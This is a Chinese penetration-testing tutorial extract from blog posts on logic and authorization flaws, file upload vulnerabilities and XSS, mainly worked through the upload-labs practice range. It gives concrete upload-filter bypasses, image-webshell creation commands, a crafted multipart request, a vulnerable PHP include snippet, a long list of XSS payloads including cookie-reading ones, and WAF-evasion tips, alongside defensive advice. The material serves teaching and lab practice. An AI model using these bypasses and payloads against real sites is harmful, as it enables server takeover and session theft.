该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。 修改返回包的越权 修改手机号 一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改 如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过 比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞 登录绕过 部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号 水平越权 遍历ID 在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题 ID替换 如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题 垂直越权 观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改 防范措施采用成熟的权限管理框架（如spring security） 验证用户是否具有操作数据的权限 用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用在服务端关联session或加密后放在session中的方式获取 应对用户凭证（如用户ID、产品号码、订单流水号等）采用难以猜测的构造方式（如随机数）或采用复杂的加密算法加密后再提交 对管理功能模块进行严格的权限验证","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件上传","slug":"渗透测试/3. 文件上传","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:30.807Z","comments":true,"path":"posts/[object Object]/渗透测试/3. 文件上传/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/undefined","excerpt":"","text":"文件上传 概念文件上传漏洞是指用户上传了一个可执行的脚本文件webshell，而且通过这个脚本文件获得了执行服务器端命令的能力。 Webshell 以 ASP、PHP、JSP 等网页文件形式存在的一种命令执行环境，也称其为一种网页后门，通过 Webshell 可以对所在服务器进行远程管理。 危害非法用户可以利用上传的恶意脚本文件WebShell控制整个网站，甚至控制服务器。也可将WebShel脚本称为一 种网页后门，WebShel脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。 网站被植入黑链（博彩、黄色） 挖矿 文件泄露 产生原因前端或者服务端代码未对客户端上传的文件进行严格的验证和过滤。 文件上传漏洞发生的前提 1、网站上传功能能正常使用2、文件类型允许上传3、上传路径可以确定4、文件可以被访问，可以被执行或被包含 查找和判断黑盒查找：不知道源代码情况下，通过目录扫描和网站应用，以及通过网站后台、会员中心进行获取权限，需要自己判断。 白盒查找：通过源代码分析文件上传漏洞。 判断：通过抓包分析 文件上传的分类 常规类 CMS类 CMS 又叫网站内容管理系统（网站的模版，帮助我们快速建站，我们会在这个网站模板上做二次开发），市面上很多开源的CMS 的历史版本有很多都存在着文件上传漏洞，但是产生文件上传漏洞的原因不尽相同。 比如常见的dedeCMS（织梦）、PHPcms、Seacms 等。 参考：https://blog.csdn.net/qq_35733751/article/details/115317967 编辑器类 编辑器就是网站后台编辑网页的在线编辑器，会自动集成文件上传功能，这些编辑器的某些版本也存在文件上传漏洞，从而进行getshell 比如ewebeditor、fckeditor。 参考：https://www.likecs.com/show-203442332.html CVE 比如，Weblogic任意文件上传漏洞( CVE-2018-2894 ) 文件上传的利用 找到上传的位置 常规文件上传地址的获取说明： 比如搜索引擎搜索inurl:upload.php、网站的目录扫描（御剑）、针对网站搜索upload关键词site:abc.com upload、网站自身的应用（上传头像、图片等）。 尝试绕过校验，上传php文件 upload-fuzz-dic-builder 上传漏洞fuzz字典生成脚本：https://github.com/c0ny1/upload-fuzz-dic-builder 文件上传攻击一般配合文件解析漏洞，比如nginx解析漏洞。具体可以看文件上传攻击的防护及绕过。 获得文件位置 上传文件后，要想执行，必须先获取文件路径。可以拖动上传的文件到新标签页得到文件路径，或者看看URL、或者看网站有没有查看所上传文件的地方。 蚁剑&#x2F;菜刀连接，管理文件 文件上传攻击的防护及绕过 **使用github上的靶场：upload labs**（场景比DVMA更丰富），下载下来放在本地网站localhost里（phpstudy或者apache+php）。 fuzz字典：https://github.com/c0ny1/upload-fuzz-dic-builder，包含可能的攻击语句。结合BP使用。 防护思路 后端验证：采用服务端验证模式（不采用前端验证） 下面三种检测方式同时进行： 后缀检测：基于黑名单，白名单过滤 MIME 检测：基于上传自带类型检测 内容检测：文件头，完整性检测 自带函数过滤（就PHP脚本而言） 比如getimagesize()函数检查文件头；exif_imagetype()函数检查文件类型等等 自定义函数过滤：function check_file(){} 结合黑名单和白名单，可以两者相互嵌套 WAF 防护产品：宝塔，云盾，安全公司产品等 如果存在waf,就无法判断是否存在文件上传漏洞，只有一一尝试。 1. 前端限制文件类型（白名单）破解方法一：直接F12，删除（禁用）前端的限制文件类型的JS脚本。上传成功后，拖动图片到新标签页得到文件路径。 破解方法二：先上传网站允许的文件后缀，然后BP抓包修改文件后缀为php。 2. MIME类型参考upload-labs Pass-2。 在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。作用和文件拓展名相似，但不同的是它并非标注文件，而是在邮件和HTTP协议中用来标注网络数据的。 客户端使用: 1、GET请求不需要这个字段。2、POST请求头，放在Content Type字段 用来指定上传的文件类型，方便服务器解析。放在Accept, 告诉服务端允许接收的响应类型。比如只能接收json或者其他。 服务端使用: 1、放在响应头里面，Content Type 告诉客户端响应的数据类型，方便客户端解析。 MIME 描述 text&#x2F;html HTML格式 application&#x2F;json JSON数据格式 multipart&#x2F;form-data 文件上传(二进制数据) image&#x2F;jpeg、image&#x2F;gif、image&#x2F;pjpeg jpg、gif、pjpeg图片格式 MIME类型的确定根据的是文件扩展名。 破解方法：BP抓包，修改MIME类型为image&#x2F;jpeg即可绕过上传。 3. 文件后缀黑名单参考upload-labs Pass-4。 禁止asp、php等类型文件上传。 破解方法：使用等价扩展名。 语言 等价扩展名 asp asa,cer,cdx aspx ashx,asmx,ascx php php2、 php3、 php4、 php5、 phps、 phtml jsp jspx.jspf 文件后缀绕过 文件后缀绕过攻击是服务端代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果增加其他后缀为shell.php.phtml，则能够解析php和phtml文件。 在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀php。而服务器如果使用php的pathinfo()来获取文件后缀，那么只会看到后缀xxxx，因此实现了绕过。 4. 很全的黑名单+大小写模糊（.htaccess绕过）黑名单更多了一些，不过没有过滤.htaccess后缀，参考upload-labs Pass-4。 先按照如下代码块的内容写一个新的.htaccess文件，然后上传，使其处于所有上传文件所在的目录。 htaccess: Hypertext Access(超文本入口)它是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。作用：伪静态、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护 123456&lt;FilesMatch &quot;test.png&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;或者AddType application/x-httpd-php png 然后将php文件修改为.htaccess文件所指定的图片文件后缀或文件名，然后上传。因为.htaccess文件被修改，所以直接访问该图片文件时其会被服务器当作PHP文件解析。 .htaccess生效的前提： httpd.conf设置AllowOverride all，而不是none，所以phpstudy集成的apache会无法实验成功。 5. 黑名单过滤，没有考虑大小写过滤htaccess后缀，但是没有过滤php全部的大小写，使用后缀pHp即可绕过上传。参考upload-labs Pass-5。 shell.pHp 6. 黑名单过滤，没有对后缀去空在判断后缀名的时候没有先去除多余的空格。参考upload-labs Pass-6。 后缀名后添加空格即可绕过后端php脚本的检测，再上传到windows服务器上，会自动去除后缀名后的空格。 shell.php （php后面有空格） 7. 黑名单过滤，没有过滤点添加点即可绕过后端的php检测，而且可以正常解析。参考upload-labs Pass-7。 shell.php. 另外，遇到move_uploaded_file()函数时，其有这么一个特性，会忽略掉文件末尾的 &#x2F;.所以直接上传php文件，然后抓包，添加&#x2F;. 就可以绕过黑名单。参考upload-labs Pass-19。 shell.php/. 【upload-labs Pass-20】： 查看该题源码可知，若提交的保存的文件名save_name不是数组，那就以点来分割得到数组$file。而下面的EXP则是直接提交数组。 该页面会将数组的最后一个元素看作后缀名进行白名单校验，通过校验后将第一个元素和点以及最后一个元素拼接得到文件名。但是在取最后一个元素时存在漏洞：$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];。可以看如下POST请求体，save_name[0]为shell.php&#x2F;，save_name[2]为jpg，这样校验后缀名时取的是index为2的jpg。但是在拼接文件名时，由于未给save_name[1]赋值，所以count($file)的结果是2而非3，所以$file[count($file) - 1]的值为空，而非jpg。最后得到的文件名就为shell.php/.，又由于move_uploaded_file()函数会忽略这个&#x2F;.，所以该文件会被保存为shell.php。 1234567891011121314151617181920------WebKitFormBoundary0lAKZaGSiktCjkBiContent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;Content-Type: image/png&lt;?phpphpinfo();?&gt;------WebKitFormBoundary0lAKZaGSiktCjkBiContent-Disposition: form-data; name=&quot;save_name[0]&quot;shell.php/------WebKitFormBoundary0lAKZaGSiktCjkBiContent-Disposition: form-data; name=&quot;save_name[2]&quot;jpg------WebKitFormBoundary0lAKZaGSiktCjkBiContent-Disposition: form-data; name=&quot;submit&quot;上传------WebKitFormBoundary0lAKZaGSiktCjkBi-- 8. 黑名单过滤，没有过滤::$DATA参考upload-labs Pass-8。 在 Windows 操作系统中，::$DATA 是一种用于隐藏文件的特殊附加数据流（Alternate Data Stream）。它是一种扩展文件属性，可以将额外的数据附加到一个文件中，而不会影响文件的主要内容。附加数据流基于文件名和冒号之间的特殊语法，例如：file.txt::D A T A 。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得 : : DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。 这使得 ::DATA。附加数据流可以储存任意类型的数据，例如文本、二进制文件或其他文件。这使得::DATA 可以被用于隐藏文件内容、存储元数据或其他需要与主文件相关但不希望直接显示给用户的信息。 shell.php::$DATA 9. 黑名单过滤，改变符号或者多次换行比如BP抓包后，将双引号变为单引号，或者去掉文件名的双引号： 12Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=info4.phpContent-Type: image/jpeg 或者只用一个双引号（引号没有闭合，安全狗会误以为是程序自带）： 12Content-Disposition: form-data;name=&quot;uploadfile&quot;; filename=&quot;info5.phpContent-Type: image/jpeg 或者文件名内多次换行： 12345Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;x.php&quot;Content-Type: image/jpeg 10. 黑名单，；绕过.jpg;.php 分号;代表语句的结束，安全狗检测文件名字符串时，检测到jpg就结束了，后面的.php略过。 11. 删除黑名单字段（&#x3D;&#x3D;重复数据&#x3D;&#x3D;绕过）黑名单包括php、asp 破解：文件名双写：比如shell.pphphp 12. 白名单（get的%00&#x3D;&#x3D;截断绕过&#x3D;&#x3D;）参考upload-labs Pass-11。 严格限制后缀为某几种，但是请求路径使用的是get请求（request请求）。 get请求会根据文件路径做了一个00截断，../upload/1.php%00check.jpg不会被白名单过滤，而且请求后路径就被截断，变成../upload/1.php 。 00截断的操作环境需魔术引用开关magic_quotes_gpc为off状态，不然%00会被转义，导致攻击失效。 魔术引用开关magic_quotes_gpc会转义以下字符： 单引号（’）双引号（”）反斜杠（\\）NULL 但是，该方法只能绕过接收参数时的判断，如果服务器对请求后得到的路径再进行白名单的判断，因为已经被get请求截断了，后缀变成php，还是会被检测到。 13. 白名单（post的%00截断绕过）参考upload-labs Pass-12。 严格限制后缀为某几种，但是请求路径使用的是post请求（request请求）。 post需要通过BP抓包修改数据包的文件名后缀部分，需要用二进制的方式去修改。 14. &#x3D;&#x3D;判断文件头&#x3D;&#x3D;(图片马)参考upload-labs Pass-14-17。 使用了 getimagesize( $uploaded_tmp ) 来获取文件头中的图片尺寸信息，读取不到尺寸信息则拒绝上传。 此时可以使用图片马，文件后缀依然为php。此时webshell可以被解析为脚本，同时getimagesize也可以获取到图片信息。 1cat huaji.jpg shell.php &gt; shell.php 15. 判断文件头且限制后缀使用 strrpos( $uploaded_name, &#39;.&#39; ) 函数来截取文件名中最后一个 . 后面的字符，来识别为上传的文件的后缀名，并只接受后缀名为 jpg，jpeg，png 的文件。同时使用了 getimagesize( $uploaded_tmp ) 来获取文件头中的图片尺寸信息，读取不到尺寸信息则拒绝上传。 此时只能使用图片马： windows 1copy huaji.gif /b + shell.php /a shell.gif Linux 1cat huaji.jpg shell.php &gt; shell.jpg 图片马需要通过命令注入漏洞rename shell.jpg shell.php来把上一步上传的 shell.jpg 重命名为 shell.php，然后利用文件包含漏洞才能执行，使用include包含。 include 方法可以让当前页面去执行指定的另外一个文件中的代码内容。 存在如下文件：upload&#x2F;include.php，文件内容如下： 1234&lt;?php$file = $_GET[&#x27;page&#x27;] ;include ($file);?&gt; 使用localhost:8080/upload/include.php?page=shell.php可以借助蚁剑连接成功。 16. php内置函数获取图片类型比如getimagesize()、exif_imagetype()。 exif_imagetype() 读取一个图像的第一个字节并检查其签名。 exif_imagetype环境需要开启php_exit模块。如果函数出现报错，则需要去php.ini修改如下内容： 12extension=php_mbstring.dllextension=php_exif.dll 然后再重启服务器即可。 1234567891011121314151617181920&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;); //设置编码为UTF-8 不然乱码$filename = $_GET[&#x27;filename&#x27;]; //通过get传值判断文件类型$image_type = exif_imagetype($filename);echo &quot;进行判断&quot;;switch ($image_type)&#123; case IMAGETYPE_GIF: echo $filename.&quot;文件类型:GIF&quot;; break; case IMAGETYPE_JPEG: echo $filename.&quot;文件类型:jpg&quot;; break; case IMAGETYPE_PNG: echo $filename.&quot;文件类型:png&quot;; break; default: echo $filename.&quot;文件类型:未知&quot;; break;&#125;?&gt; 上图片马绕过。 17. 上传后重命名（md5）使用了 md5() 函数对上传的文件的文件名进行重命名，重命名为 MD5 散列运算之后的值。可以防御通过 00 截断来解析一句话木马。同时使用了随机 Token 检查来增加修改数据包上传的难度。 18. 竞争条件攻击参考upload-labs Pass-18。 一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShel脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差(因为要执行检查文件和删除文件的操作) , 攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 19. &#x3D;&#x3D;数据溢出&#x3D;&#x3D;php文件被安全狗拦截： 修改数据包上传Content-Disposition: form-data; name=&quot;uploadfile&quot;;中间插入大量的垃圾数据从而绕过。 20. 站库分离文件和网站放在不同的服务器上，即单独设置文件服务器的域名。这样就无法通过上传的文件对网站服务器进行渗透。 IIS解析漏洞IIS6.0文件解析漏洞 IIS除了可以解析.asp后缀的脚本以外，还可以解析.cer和.asa后缀的文件。 特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行 特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行IIS7.5文件解析漏洞任意文件名&#x2F;任意文件名.php，解析为php脚本文件。 Apache解析漏洞Apache httpd 多后缀解析漏洞主要是因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准） Apache换行解析漏洞（CVE-2017-15715）影响范围：2.4.0-2.4.29版本 原因：合法后缀配置文件中的正则表达式中$不仅匹配字符串结尾位置，还可以匹配\\n或\\r，在解析php时，1.php\\x0A将按照.php进行解析，而’.php\\x0A’ !&#x3D; ‘.php’,可能过滤时过滤了.php但没有过滤.php\\x0A从而实现绕过。 Nginx解析漏洞任意文件名&#x2F;任意文件名.php，解析为php脚本文件。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"XSS","slug":"渗透测试/4. XSS","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:44.303Z","comments":true,"path":"posts/[object Object]/渗透测试/4. XSS/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined","excerpt":"","text":"XSS 概述XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本，导致被攻击的行为。通常出现在搜索框、留言板、评论区等地方。 与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 XSS 一般提交的是 Javascript 脚本，运行在 Web 前端，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。 攻击流程如下： 攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。 诱使受害者打开受到攻击的服务器URL。 受害者在Web浏览器中打开URL，恶意脚本执行。 本质：前端对于用户提交的参数没有审查就用于页面加载； 产生层面：前端，浏览器；攻击目标是通过前端脚本获取用户的数据。 XSS常用的函数类：输出类：echo printf print print_r sprintf die var-dump var_export 攻击成功与否受浏览器内核影响。一些高版本浏览器内核会主动过滤恶意脚本，阻止XSS攻击。 通常，在XSS攻击中，攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接，例如攻击者通过E-mail向用户发送一个包含恶意代码的网站home.com，用户点击链接后，浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码，将用户与home.com交互的Cookie和Session等信息发送给攻击者，攻击者拿到这些数据之后，就会伪装成用户与真正的网站进行会话，从事非法活动，其过程如下图所示。 危害受JS脚本的功能决定。 挂马、挖矿 盗取用户Cookie。 DOS（拒绝服务）客户端浏览器。 钓鱼攻击，高级的钓鱼技巧。 恶意篡改页面。 劫持用户Web行为，甚至进一步渗透内网。 爆发Web2.0蠕虫。 蠕虫式的DDoS攻击。 蠕虫式挂马攻击、植入广告，或者发送垃圾信息、刷浏量、破坏网上数据 其它安全问题 常用攻击语句一般会借助HTML标签的一些触发事件来执行攻击脚本。 script标签 在 HTML 页面中插入一段 JavaScript： &lt;script&gt;alert(1)&lt;/script&gt; img标签 img标签支持 onerror 事件属性，在装载文档或图像的过程中如果发生了错误，就会触发onerror事件。利用onerror的特性来完成XSS。 12&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onerror=javascript:alert(1)&gt; svg标签 svg标签支持 onload 时间属性，页面结束加载之后触发。 &lt;svg onload=alert(1)&gt; 超链接标签 解析href所指链接，此处作用是发生动作时执行一段javascript代码。 &lt;a href=javascript:alert(1)&gt;&lt;/a&gt; audio标签 12&lt;audio src=x onerror=alert(1)&gt;&lt;audio src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/audio&gt; video标签 &lt;video src=x onerror=prompt(1);&gt; div标签 12&lt;div style=&quot;width:expression(alert(/1/))&quot;&gt;1&lt;/div&gt; ie浏览器执行&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt; url编码绕过 math标签 12&lt;math&gt;&lt;a/xlink:href=javascript:prompt(1)&gt;Xss&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;Xss&lt;/math&gt; button标签 12&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1) &gt;xss&lt;/button&gt; keygen标签 12&lt;keygen/onfocus=prompt(1);&gt;&lt;keygen onfocus=javascript:alert(1) autofocus&gt; object标签 12345&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;base64编码：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg 解码：&lt;script&gt;alert(1)&lt;/script&gt; iframe标签 123&lt;IFRAME width%3d&quot;420&quot; height%3d&quot;315&quot; frameborder%3d&quot;0&quot; onload%3d&quot;alert(document.cookie)&quot;&gt;&lt;%2fIFRAME&gt;&lt;iframe%2fsrc%3d&quot;data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d&quot;&gt;&lt;iframe srcdoc%3d&#x27;%26lt%3bbody onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b&#x27;&gt; 分类反弹型 XSS（非持续型）过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php（XSS在前端执行）&#x3D;&gt; 回包 反射型 XSS 是指恶意的攻击脚本包含在 URL 中，只有当用户主动访问了包含恶意脚本的 URL，脚本才会被成功执行。反射型的攻击，攻击脚本经过后台服务器，但是不会写入网站的数据库，是一次性的攻击，所以黑客一般需要诱骗用户点击包含攻击脚本的 URL（钓鱼邮件），才能攻击成功。 比如在get请求中构造攻击语句，输出用户在该网站的cookie： ?name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;（name参数为数值的话就不加引号） 该语句输出到页面的HTML就变为： 1&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt; 存储型 XSS（持续型）过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php &#x3D;&gt; XSS被写入数据库 &#x3D;&gt; 他人访问页面执行index.php &#x3D;&gt; 回包（XSS在前端被执行） 存储型 XSS 则是把攻击脚本提交到网站 后台数据库，只要有人访问了显示该数据内容的页面，就会被攻击。存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，可能存在于一些我们信任的网站，具有很高的隐蔽性。 攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。 相对于反射型，存储型的 XSS 成功率更高。 比如，下面的网站有留言板功能，尝试在 Name框或者Message 框提交弹窗脚本输出当前 cookie，可以构造如下XSS攻击语句&lt;script&gt;alert(document.cookie)&lt;/script&gt;，网站在回显我的留言时XSS脚本就会在HTML中执行。 DOM 型 XSS（DOM）过程：参数x&#x3D;xss 然后发包 &#x3D;&gt; 携带该参数执行本地浏览器前端代码（XSS在前端被执行） （&#x3D;&gt; index.php &#x3D;&gt; 回包） DOM DOM全称Document Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。根据用户在页面的操作或提交的参数，对网页进行动态更新，比如点击查看更多、在页面输入内容后立即回显在页面等。 HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。 通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。HTML DOM树结构如图所示。 在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。 DOM型XSS DOM 型 XSS 是指 基于DOM文档对象模型 的 XSS 攻击，攻击的输出点就位于 DOM 对象上，如document.referer、document.write等等，是一种特殊类型的反射型XSS。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。 攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，在本地浏览器前端HTML执行攻击脚本，导致存在XSS漏洞。 举例 比如下面的网站功能是选择一种语言，会以get请求接收参数default，并且在前端回显（会在HTML中用到所提交的参数）。查看页面HTML代码，发现default的值被用于以 document.write 的方式来写入网页，使网页显示所选的language，由此确定页面的XSS方式为DOM型。（对客户端网页进行了访问和更新） 在 URL 后直接加入攻击脚本 &lt;script&gt;alert(document.cookie)&lt;/script&gt;，即可实现攻击。 有时需要查看页面HTML源码，考虑闭合语法。比如当使用img标签进行攻击时，攻击脚本应为 &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;，以闭合select和option标签。 防御 比如用户输入的参数”$var”被用于如下代码，造成DOM型的XSS。 1234&lt;script&gt;var x=&quot;$var&quot;;document.write(&quot;&lt;a href=&#x27;&quot;+x+&quot;&#x27; &gt;test&lt;/a&gt;&quot;);&lt;/script&gt; 为了防御这种XSS，可以采用编码的方法，在”$var” 输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode，以免又被自动解码。（执行两次编码） 也就是说，从javascript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。 XSS攻击过程 寻找目标网站 有注册输入栏、留言板之类的网站，能回显输入（也就是会在HTML中用到输入的参数）。 尝试提交攻击脚本，探查过滤规则，确定可行的攻击语句 可以使用自己构造的攻击语句； 也可以搜索XSS平台，借助XSS平台构造所需要功能的攻击语句。比如xsshs.cn、xss8.cc等。一般平台构造的语句中含有平台的链接，受害者执行攻击脚本中的该链接，导致XSS，然后在XSS平台可以查看到相应的执行结果。 查看网页元素，确定脚本执行情况 攻击脚本执行成功后，查看XSS平台，获取到浏览器信息，比如cookie。 根据获得的信息进行进一步攻击 比如是网站的管理员执行了XSS，受到攻击，那么就能获取到管理员的cookie。 用户凭据：通过凭据可以判断对方身份信息 cookie：存储本地，存活时间较长，常用于小中型网站（账号登录） session：会话，存储服务器（占用服务器资源），存活时间较短，常用于大型网站（支付） XSS自动化工具XSStrike https://github.com/s0md3v/XSStrike XSStrike 主要支持反射和 DOM XSS，支持扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。 XSStrike常用命令： 12345678910111213141516171819202122-h, --help //显示帮助信息-u, --url //指定目标 URL--data //POST 方式提交内容-v, --verbose //详细输出-f, --file //加载自定义 paload 字典-t, --threads //定义线程数-l, --level //爬行深度-t, --encode //定义 payload 编码方式--json //将 POST 数据视为 JSON--path //测试 URL 路径组件--seeds //从文件中测试、抓取 URL--fuzzer //测试过滤器和 Web 应用程序防火墙。--update //更新--timeout //设置超时时间（防止cc拦截）--params //指定参数--crawl //爬行--proxy //使用代理--blind //盲测试--skip //跳过确认提示--skip-dom //跳过 DOM 扫描--headers //提供 HTTP 标头-d, --delay //设置延迟 使用流程： 运行工具 fuzzer攻击语句扫描 确定网站会过滤哪些语句，哪些语句又不会被拦截。 —offline说明waf是离线的状态，这里是因为该工具为外国开发，识别不到安全狗。 —passed为没有拦截，filtered为有过滤 测试扫描结果 选择攻击语句 选择一个不会被拦截的XSS攻击语句， 在浏览器中进行攻击 有可能出现请求过于频繁，被网站拦截 —对于拦截，请求频繁被cc攻击拦截后，重启靶场phpStudy即可 —实际进行网站测试时，可以现在本地搭建环境，测试那些语句不会拦截在进行漏洞测试 —还有一种方法：用代理（比较麻烦） 或者直接自动攻击： 配合字典进行fuzz模糊测试： xssfuzz在线fuzz工具 https://xssfuzzer.com/fuzzer.html 用于自动生成各种XSS攻击payload： BP配合fuzzDicts进行攻击： https://github.com/TheKingOfDuck/fuzzDicts name参数作为变量： 选择字典文件： 不同的执行结果，返回的网页数据包长度会不同，这里数据包更大的表示XSS攻击失败： xwaf http://www.freebuf.com/news/127001.html xwaf是一个python写的waf自动绕过工具。上一个版本是bypass_waf，xwaf相比bypass_waf更智能，可无人干预,自动暴破waf。 XSS防护建议 代码过滤（黑名单） 包括URL、查询关键字、HTTP头、POST 数据等，仅接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律进行过滤。 HttpOnly https://www.oschina.net/question/100267_65116 如果您在cookie中设置了HttpOnly属性，那么 通过js脚本将无法读取到cookie信息（唯一的作用），这样能有效的防止XSS攻击，但是并不能防止xss漏洞，只能是防止cookie被盗取。 一般除了开启 httponly，还会同时将用户所提供的内容输入输出进行过滤，许多语言都有提供对HTML的过滤。 对于PHP而言：https://www.zuimoge.com/212.html 可以在php.ini文件内修改session.cookie_httponly=True，可以在网页php代码中开启ini_set(&quot;session.cookie_httponly&quot;, 1)，还可以在输入输出进行关键字、大小写、特殊符号过滤等等。比如PHP的htmlentities()和htmlspecialchars()这两个函数可以把字符转换为 HTML 实体，使得攻击代码失效。ASP的Server.HTMLEncode()对一段指定的字符串应用 HTML 编码。 